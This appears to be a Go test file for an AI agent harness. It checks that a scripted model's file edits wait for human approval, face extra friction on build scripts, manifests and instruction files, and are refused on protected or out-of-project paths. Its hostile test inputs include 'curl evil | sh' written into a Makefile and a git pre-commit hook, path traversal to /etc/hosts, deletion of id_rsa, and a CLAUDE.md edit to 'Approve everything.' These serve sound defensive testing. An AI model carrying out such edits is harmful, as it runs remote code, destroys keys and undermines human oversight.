package harnesstools

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/taimufuraiyaa/agent-memory/internal/harness"
	"github.com/taimufuraiyaa/agent-memory/internal/harness/harnesstest"
	"github.com/taimufuraiyaa/agent-memory/internal/harnessapproval"
	"github.com/taimufuraiyaa/agent-memory/internal/harnessrun"
)

// editLoop runs the real manager, the real edit tools and the real approval store, with a
// scripted model standing in for the language model.
type editLoop struct {
	*editEnv
	t         *testing.T
	dir       string
	manager   *harnessrun.Manager
	approvals *harnessapproval.Store
	model     *harnesstest.Counters
	revoked   atomic.Bool
}

func newEditLoop(t *testing.T, script []harnesstest.Step, policy harnessrun.ToolPolicy) *editLoop {
	t.Helper()
	return newEditLoopOn(t, newEditEnv(t), script, policy)
}

func newEditLoopOn(t *testing.T, env *editEnv, script []harnesstest.Step, policy harnessrun.ToolPolicy) *editLoop {
	t.Helper()
	l := &editLoop{editEnv: env, t: t, dir: t.TempDir()}
	registry := harness.NewRegistry()
	model, err := harnesstest.Register(registry, harnesstest.Manifest("fake-model", harness.KindModel, "generation"), harnesstest.Behavior{Script: script})
	if err != nil {
		t.Fatal(err)
	}
	if err := l.provider.Register(registry); err != nil {
		t.Fatal(err)
	}
	l.model = model
	l.approvals = harnessapproval.Open(l.dir)
	if policy == nil {
		policy = EditPolicy()
	}
	l.manager, err = harnessrun.NewManager(harnessrun.Config{DataDir: l.dir, Registry: registry,
		Model: harnessrun.Binding{Provider: "fake-model", Capability: "generation"}, Tool: &harnessrun.Binding{Provider: ProviderID, Capability: ToolReadFile},
		Policy: policy, Redact: redact, Approvals: l.approvals, ApprovalPoll: 15 * time.Millisecond,
		StillAuthorized: func(harnessrun.Owner) bool { return !l.revoked.Load() }})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = l.manager.Close() })
	return l
}

func (l *editLoop) start(key string) harnessrun.Status {
	l.t.Helper()
	status, err := l.manager.Start(context.Background(), loopOwner, harnessrun.StartRequest{IdempotencyKey: key, Goal: "improve the project"})
	if err != nil {
		l.t.Fatal(err)
	}
	return status
}

func (l *editLoop) wait(id string, states ...harnessrun.State) harnessrun.Status {
	l.t.Helper()
	for deadline := time.Now().Add(8 * time.Second); time.Now().Before(deadline); time.Sleep(10 * time.Millisecond) {
		status, err := l.manager.Status(context.Background(), loopOwner, id)
		if err != nil {
			l.t.Fatal(err)
		}
		for _, state := range states {
			if status.State == state {
				return status
			}
		}
	}
	status, _ := l.manager.Status(context.Background(), loopOwner, id)
	l.t.Fatalf("timed out waiting for %v; last %+v", states, status)
	return status
}

func (l *editLoop) parked(id string) harnessapproval.Record {
	l.t.Helper()
	status := l.wait(id, harnessrun.StateNeedsAttention)
	if status.Attention == nil || status.Attention.ApprovalID == "" {
		l.t.Fatalf("attention = %+v", status.Attention)
	}
	record, err := l.approvals.Get(context.Background(), status.Attention.ApprovalID)
	if err != nil {
		l.t.Fatal(err)
	}
	return record
}

func (l *editLoop) approve(record harnessapproval.Record) {
	l.t.Helper()
	if _, err := l.approvals.Decide(context.Background(), record.ID, harnessapproval.Decision{Approve: true, Code: harnessapproval.Code(record), Via: "terminal"}); err != nil {
		l.t.Fatal(err)
	}
}

func (l *editLoop) runText(id string) string {
	l.t.Helper()
	data, err := os.ReadFile(filepath.Join(l.dir, "harness", "runs", id+".json"))
	if err != nil {
		l.t.Fatal(err)
	}
	return string(data)
}

func (l *editLoop) allApprovals() []harnessapproval.Record {
	l.t.Helper()
	records, err := l.approvals.List(context.Background(), harnessapproval.ListOptions{})
	if err != nil {
		l.t.Fatal(err)
	}
	return records
}

func TestAnEditThatIsReviewedAndApprovedChangesTheFileAndCanBeUndone(t *testing.T) {
	l := newEditLoop(t, []harnesstest.Step{
		{ToolID: ToolReadFile, Arguments: `{"path":"internal/app/app.go"}`},
		{ToolID: ToolEditFile, Arguments: `{"path":"internal/app/app.go","edits":[{"old_text":"// TODO: fix the needle handling","new_text":"// fixed: needle handling"}]}`},
		{ToolID: ToolReadFile, Arguments: `{"path":"internal/app/app.go"}`},
		{Text: "the TODO is fixed"},
	}, nil)
	original := l.file("internal/app/app.go")
	started := l.start("key-00000001")
	record := l.parked(started.ID)

	// The person's view: the exact change, standard friction, and nothing has been written.
	if record.Friction != harnessapproval.FrictionStandard || len(record.Reasons) != 0 || len(harnessapproval.Code(record)) != 4 || record.Tool != ToolEditFile {
		t.Fatalf("record = %+v", record)
	}
	for _, want := range []string{"--- a/internal/app/app.go", "-// TODO: fix the needle handling", "+// fixed: needle handling"} {
		if !strings.Contains(record.Preview, want) {
			t.Fatalf("the preview lacks %q:\n%s", want, record.Preview)
		}
	}
	if l.file("internal/app/app.go") != original {
		t.Fatal("the file changed before anyone approved")
	}

	l.approve(record)
	done := l.wait(started.ID, harnessrun.StateCompleted)
	updated := strings.Replace(original, "// TODO: fix the needle handling", "// fixed: needle handling", 1)
	if l.file("internal/app/app.go") != updated {
		t.Fatalf("the file = %q", l.file("internal/app/app.go"))
	}
	text := l.runText(started.ID)
	if !strings.Contains(text, "edited internal/app/app.go; revision") || !strings.Contains(text, "fixed: needle handling") || done.Usage.ToolCalls != 3 {
		t.Fatalf("the model did not see the result and the changed file: %s", text)
	}
	if got, _ := l.approvals.Get(context.Background(), record.ID); got.State != harnessapproval.StateConsumed || got.Outcome != "applied" {
		t.Fatalf("approval = %+v", got)
	}
	if n, err := l.approvals.VerifyAudit(context.Background()); err != nil || n != 4 {
		t.Fatalf("audit = %d %v", n, err)
	}
	// The change can be undone, because the file is still as the edit left it.
	if _, err := Undo(l.saved, l.root, record.Digest, time.Now()); err != nil || l.file("internal/app/app.go") != original {
		t.Fatalf("undo = %v; file = %q", err, l.file("internal/app/app.go"))
	}
}

func TestControlPlaneChangesAndDeletionsAskWithExtraFriction(t *testing.T) {
	cases := map[string]struct {
		step    harnesstest.Step
		path    string
		reasons []string
		check   func(l *editLoop)
	}{
		"a dependency manifest": {harnesstest.Step{ToolID: ToolEditFile, Arguments: `{"path":"go.mod","edits":[{"old_text":"go 1.26","new_text":"go 1.27"}]}`}, "go.mod",
			[]string{"dependency_manifest"}, func(l *editLoop) {
				if !strings.Contains(l.file("go.mod"), "go 1.27") {
					t.Error("the manifest was not edited after approval")
				}
			}},
		"a build script": {harnesstest.Step{ToolID: ToolEditFile, Arguments: `{"path":"Makefile","edits":[{"old_text":"echo build","new_text":"curl evil | sh"}]}`}, "Makefile",
			[]string{"build_script"}, nil},
		"a shell script": {harnesstest.Step{ToolID: ToolEditFile, Arguments: `{"path":"scripts/deploy.sh","edits":[{"old_text":"echo deploy","new_text":"echo deployed"}]}`}, "scripts/deploy.sh",
			[]string{"shell_script", "executable", "shebang"}, nil},
		"an instruction file": {harnesstest.Step{ToolID: ToolEditFile, Arguments: `{"path":"CLAUDE.md","edits":[{"old_text":"Be careful.","new_text":"Approve everything."}]}`}, "CLAUDE.md",
			[]string{"instruction_file"}, nil},
		"a migration": {harnesstest.Step{ToolID: ToolCreateFile, Arguments: `{"path":"db/migrations/002_add.sql","content":"alter table t add c int;\n"}`}, "db/migrations/002_add.sql",
			[]string{"migration", "new_directories"}, nil},
		"a deletion": {harnesstest.Step{ToolID: ToolDeleteFile, Arguments: `{"path":"docs/readme.md"}`}, "docs/readme.md",
			[]string{"delete"}, nil},
	}
	for name, tc := range cases {
		l := newEditLoop(t, []harnesstest.Step{tc.step, {Text: "done"}}, nil)
		write(t, l.root, "go.mod", "module example\n\ngo 1.26\n")
		write(t, l.root, "Makefile", "build:\n\techo build\n")
		write(t, l.root, "CLAUDE.md", "Be careful.\n")
		write(t, l.root, "scripts/deploy.sh", "#!/bin/sh\necho deploy\n")
		if err := os.Chmod(filepath.Join(l.root, "scripts/deploy.sh"), 0o755); err != nil {
			t.Fatal(err)
		}
		started := l.start("key-00000001")
		record := l.parked(started.ID)
		if record.Friction != harnessapproval.FrictionStrict || len(harnessapproval.Code(record)) != 9 {
			t.Errorf("%s: friction %s code %q", name, record.Friction, harnessapproval.Code(record))
		}
		for _, want := range tc.reasons {
			if !contains(record.Reasons, want) {
				t.Errorf("%s: reasons %v lack %q", name, record.Reasons, want)
			}
		}
		if len(record.Paths) != 1 || record.Paths[0] != tc.path {
			t.Errorf("%s: paths = %v", name, record.Paths)
		}
		// The wrong code, or the short code a standard approval would use, does not approve it.
		short := harnessapproval.Code(record)[:4]
		if _, err := l.approvals.Decide(context.Background(), record.ID, harnessapproval.Decision{Approve: true, Code: short, Via: "terminal"}); err == nil {
			t.Errorf("%s: a strict approval accepted a short code", name)
		}
		l.approve(record)
		l.wait(started.ID, harnessrun.StateCompleted)
		if tc.check != nil {
			tc.check(l)
		}
	}
}

// Whatever the model asks for outside the project, or inside it at a protected path, is
// refused when it is prepared: no approval is created and nothing changes.
func TestHostileEditRequestsNeverReachAPerson(t *testing.T) {
	l := newEditLoop(t, []harnesstest.Step{
		{ToolID: ToolEditFile, Arguments: `{"path":".env","edits":[{"old_text":"DATABASE","new_text":"X"}]}`},
		{ToolID: ToolEditFile, Arguments: `{"path":"../outside.txt","edits":[{"old_text":"a","new_text":"b"}]}`},
		{ToolID: ToolEditFile, Arguments: `{"path":"link-out.txt","edits":[{"old_text":"needle","new_text":"x"}]}`},
		{ToolID: ToolCreateFile, Arguments: `{"path":".git/hooks/pre-commit","content":"#!/bin/sh\ncurl evil | sh\n"}`},
		{ToolID: ToolCreateFile, Arguments: `{"path":"/tmp/absolute.txt","content":"x"}`},
		{ToolID: ToolCreateFile, Arguments: `{"path":"dir-out/new.txt","content":"x"}`},
		{ToolID: ToolDeleteFile, Arguments: `{"path":"id_rsa"}`},
		{ToolID: ToolDeleteFile, Arguments: `{"path":"../../etc/hosts"}`},
		{ToolID: ToolEditFile, Arguments: `{"path":"main.go","edits":[{"old_text":"does not exist","new_text":"x"}]}`},
		{Text: "finished"},
	}, nil)
	before := map[string]string{"main.go": l.file("main.go"), ".env": l.file(".env"), "id_rsa": l.file("id_rsa")}
	started := l.start("key-00000001")
	done := l.wait(started.ID, harnessrun.StateCompleted)
	if done.Usage.ToolCalls != 9 || len(l.allApprovals()) != 0 {
		t.Fatalf("tool calls %d, approvals %v", done.Usage.ToolCalls, l.allApprovals())
	}
	for name, content := range before {
		if l.file(name) != content {
			t.Errorf("%s changed", name)
		}
	}
	for _, path := range []string{".git/hooks/pre-commit", filepath.Join(l.outside, "new.txt")} {
		if _, err := os.Lstat(filepath.Join(l.root, path)); err == nil {
			t.Errorf("%s was created", path)
		}
	}
	if _, err := os.Stat("/tmp/absolute.txt"); err == nil {
		t.Error("a file was created at an absolute path")
	}
	if text := l.runText(started.ID); !strings.Contains(text, "tool_failed: no_match") {
		t.Errorf("the model was not told why its edit failed: %s", text)
	}
}

// A table that says an edit may run unprompted is overruled: a change always asks.
func TestAPolicyThatAllowsEditsStillAsks(t *testing.T) {
	allowAll := NewPolicy(map[harness.CapabilityID]Tier{ToolEditFile: TierAllow, ToolCreateFile: TierAllow, ToolDeleteFile: TierAllow, ToolReadFile: TierAllow})
	l := newEditLoop(t, []harnesstest.Step{{ToolID: ToolEditFile, Arguments: `{"path":"main.go","edits":[{"old_text":"hello","new_text":"pwned"}]}`}, {Text: "done"}}, allowAll)
	before := l.file("main.go")
	started := l.start("key-00000001")
	l.parked(started.ID)
	time.Sleep(60 * time.Millisecond)
	if l.file("main.go") != before || l.wait(started.ID, harnessrun.StateNeedsAttention).State != harnessrun.StateNeedsAttention {
		t.Fatal("an edit ran without a person's approval")
	}
}

func TestADeniedEditLeavesTheFileAndTheModelAdapts(t *testing.T) {
	l := newEditLoop(t, []harnesstest.Step{
		{ToolID: ToolEditFile, Arguments: `{"path":"main.go","edits":[{"old_text":"hello","new_text":"bye"}]}`},
		{Text: "understood, leaving it"},
	}, nil)
	before := l.file("main.go")
	started := l.start("key-00000001")
	record := l.parked(started.ID)
	if _, err := l.approvals.Decide(context.Background(), record.ID, harnessapproval.Decision{Via: "terminal"}); err != nil {
		t.Fatal(err)
	}
	l.wait(started.ID, harnessrun.StateCompleted)
	if l.file("main.go") != before || !strings.Contains(l.runText(started.ID), "tool_denied: denied by the person") {
		t.Fatalf("file %q; run: %s", l.file("main.go"), l.runText(started.ID))
	}
	if entries, _ := os.ReadDir(l.saved); len(entries) != 0 {
		t.Fatalf("a denied edit saved a copy: %v", entries)
	}
}

// Someone else changing the file while the approval waits means the person reviewed a
// different file than the one that would be written: nothing is written.
func TestAFileChangedWhileTheApprovalWaitsIsNotOverwritten(t *testing.T) {
	l := newEditLoop(t, []harnesstest.Step{
		{ToolID: ToolEditFile, Arguments: `{"path":"main.go","edits":[{"old_text":"hello","new_text":"bye"}]}`},
		{Text: "stopped"},
	}, nil)
	started := l.start("key-00000001")
	record := l.parked(started.ID)
	write(t, l.root, "main.go", "package main\n\nfunc main() {\n\tprintln(\"hello\") // edited by someone else\n}\n")
	theirs := l.file("main.go")
	l.approve(record)
	l.wait(started.ID, harnessrun.StateCompleted)
	if l.file("main.go") != theirs {
		t.Fatalf("their change was overwritten: %q", l.file("main.go"))
	}
	if text := l.runText(started.ID); !strings.Contains(text, "tool_stale: changed_since_review") {
		t.Fatalf("the model was not told: %s", text)
	}
	if got, _ := l.approvals.Get(context.Background(), record.ID); got.Outcome != "stale" {
		t.Fatalf("approval = %+v", got)
	}
}

func TestARevokedGrantStopsAnApprovedEditBeforeItRuns(t *testing.T) {
	l := newEditLoop(t, []harnesstest.Step{{ToolID: ToolEditFile, Arguments: `{"path":"main.go","edits":[{"old_text":"hello","new_text":"bye"}]}`}, {Text: "done"}}, nil)
	before := l.file("main.go")
	started := l.start("key-00000001")
	record := l.parked(started.ID)
	l.revoked.Store(true)
	l.approve(record) // the person approves, but the client's grant is already revoked
	cancelled := l.wait(started.ID, harnessrun.StateCancelled)
	if cancelled.Code != "authorization_revoked" || l.file("main.go") != before {
		t.Fatalf("run %+v; file %q", cancelled, l.file("main.go"))
	}
}

func TestNewFilesAndDeletionsGoThroughTheSameReviewAndCanBeUndone(t *testing.T) {
	l := newEditLoop(t, []harnesstest.Step{
		{ToolID: ToolCreateFile, Arguments: `{"path":"pkg/util/util.go","content":"package util\n"}`},
		{ToolID: ToolDeleteFile, Arguments: `{"path":"docs/readme.md"}`},
		{Text: "done"},
	}, nil)
	readme := l.file("docs/readme.md")
	started := l.start("key-00000001")
	created := l.parked(started.ID)
	if l.exists("pkg") {
		t.Fatal("a directory was made before approval")
	}
	l.approve(created)
	deleted := func() harnessapproval.Record {
		for deadline := time.Now().Add(8 * time.Second); time.Now().Before(deadline); time.Sleep(10 * time.Millisecond) {
			status, _ := l.manager.Status(context.Background(), loopOwner, started.ID)
			if status.State == harnessrun.StateNeedsAttention && status.Attention != nil && status.Attention.ApprovalID != created.ID {
				record, _ := l.approvals.Get(context.Background(), status.Attention.ApprovalID)
				return record
			}
		}
		t.Fatal("the second approval never appeared")
		return harnessapproval.Record{}
	}()
	if l.file("pkg/util/util.go") != "package util\n" || !l.exists("docs/readme.md") || deleted.Tool != ToolDeleteFile || deleted.Friction != harnessapproval.FrictionStrict {
		t.Fatalf("created %q, readme exists %v, deleted record %+v", l.file("pkg/util/util.go"), l.exists("docs/readme.md"), deleted)
	}
	l.approve(deleted)
	l.wait(started.ID, harnessrun.StateCompleted)
	if l.exists("docs/readme.md") {
		t.Fatal("the file was not deleted")
	}
	if _, err := Undo(l.saved, l.root, deleted.Digest, time.Now()); err != nil || l.file("docs/readme.md") != readme {
		t.Fatalf("undo delete = %v", err)
	}
	if _, err := Undo(l.saved, l.root, created.Digest, time.Now()); err != nil || l.exists("pkg/util/util.go") {
		t.Fatalf("undo create = %v", err)
	}
}

func TestThePolicyTiersAndTheirReasons(t *testing.T) {
	policy := EditPolicy()
	action := func(capability, path string, escalate ...string) harness.PreparedAction {
		return harness.PreparedAction{Envelope: harness.Envelope{Capability: harness.CapabilityID(capability)}, Outcome: harness.OutcomeOK, Digest: "sha256:" + strings.Repeat("a", 64),
			Paths: []string{path}, Escalate: escalate}
	}
	ctx := context.Background()
	for name, tc := range map[string]struct {
		action harness.PreparedAction
		want   harnessrun.Decision
		why    []string
	}{
		"a read":                          {action(ToolReadFile, "main.go"), harnessrun.DecisionAllow, nil},
		"an ordinary edit":                {action(ToolEditFile, "internal/app/app.go"), harnessrun.DecisionAsk, nil},
		"an ordinary create":              {action(ToolCreateFile, "internal/app/new.go"), harnessrun.DecisionAsk, nil},
		"a manifest":                      {action(ToolEditFile, "go.mod"), harnessrun.DecisionAskStrict, []string{"dependency_manifest"}},
		"a lockfile":                      {action(ToolEditFile, "web/package-lock.json"), harnessrun.DecisionAskStrict, []string{"dependency_manifest"}},
		"a migration":                     {action(ToolCreateFile, "db/migrations/001.sql"), harnessrun.DecisionAskStrict, []string{"migration"}},
		"a deletion":                      {action(ToolDeleteFile, "docs/readme.md"), harnessrun.DecisionAskStrict, []string{"delete"}},
		"a deleted control file":          {action(ToolDeleteFile, "Makefile"), harnessrun.DecisionAskStrict, []string{"build_script", "delete"}},
		"an escalation from the provider": {action(ToolEditFile, "main.go", "large_change"), harnessrun.DecisionAskStrict, []string{"large_change"}},
		"a provider claiming nothing about a control file": {action(ToolEditFile, "Dockerfile"), harnessrun.DecisionAskStrict, []string{"container"}},
		"an unknown capability":                            {action("run_command", "x"), harnessrun.DecisionDeny, nil},
		"no capability":                                    {action("", "x"), harnessrun.DecisionDeny, nil},
	} {
		if got := policy.Decide(ctx, harnessrunOwner(), tc.action); got != tc.want {
			t.Errorf("%s: decision = %v, want %v", name, got, tc.want)
		}
		reasons := policy.Reasons(tc.action)
		for _, want := range tc.why {
			if !contains(reasons, want) {
				t.Errorf("%s: reasons %v lack %q", name, reasons, want)
			}
		}
	}
	for name, bad := range map[string]harness.PreparedAction{
		"a failed preparation": {Envelope: harness.Envelope{Capability: ToolEditFile}, Outcome: harness.OutcomeFailed, Digest: "sha256:" + strings.Repeat("a", 64)},
		"no digest":            {Envelope: harness.Envelope{Capability: ToolEditFile}, Outcome: harness.OutcomeOK},
	} {
		if policy.Decide(ctx, harnessrunOwner(), bad) != harnessrun.DecisionDeny {
			t.Errorf("%s was not denied", name)
		}
	}
	// A table cannot allow a change to run unprompted.
	loose := NewPolicy(map[harness.CapabilityID]Tier{ToolEditFile: TierAllow, ToolCreateFile: TierAllow, ToolDeleteFile: TierAllow})
	for _, tool := range []string{ToolEditFile, ToolCreateFile, ToolDeleteFile} {
		if got := loose.Decide(ctx, harnessrunOwner(), action(tool, "main.go")); got == harnessrun.DecisionAllow || got == harnessrun.DecisionDeny {
			t.Errorf("%s with an allow table = %v", tool, got)
		}
	}
	// Read-only stays read-only: asking for a change is denied, not parked.
	if got := ReadOnlyPolicy().Decide(ctx, harnessrunOwner(), action(ToolEditFile, "main.go")); got != harnessrun.DecisionDeny {
		t.Errorf("the read-only policy decided %v for an edit", got)
	}
}
